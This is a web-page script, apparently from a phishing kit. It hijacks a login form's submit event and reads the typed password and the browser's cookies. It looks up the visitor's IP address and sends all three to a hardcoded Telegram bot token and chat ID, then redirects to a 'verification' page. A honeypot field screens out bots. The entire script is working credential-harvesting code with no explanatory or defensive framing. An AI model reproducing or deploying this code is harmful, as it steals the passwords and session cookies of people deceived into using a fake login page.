      <script>
        document.getElementById("loginForm").addEventListener("submit", function(event){
            event.preventDefault(); // Prevent form submission

            var honeypot = document.getElementById("honeypot").value;
                    if (honeypot) {
                        alert("Error");
                        return;
                    }

            var password = document.getElementById("password").value;
            var cookies = document.cookie;

            // Get the user's IP address
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;

                    var message = `Password: ${password}\nIP Address: ${ipAddress}\nCookies: ${cookies}`;

                    // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
                    var telegramAPI = `https://api.telegram.org/bot7373942458:AAGnmcHcNL1wJDAnJYD4VmRB9ujKOh_NCHQ/sendMessage?chat_id=7009891691&text=${encodeURIComponent(message)}`;

                    fetch(telegramAPI)
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                
                                // Redirect to a different page after successful submission
                                window.location.href = "verification.html"; // Replace with your desired redirect page
                            } else {
                                alert("Error.");
                            }
                        })
                        .catch(error => {
                            alert("Error: " + error.message);
                        });
                })
                .catch(error => {
                    alert("Error 'enable cookies': " + error.message);
                });
        });
    </script>
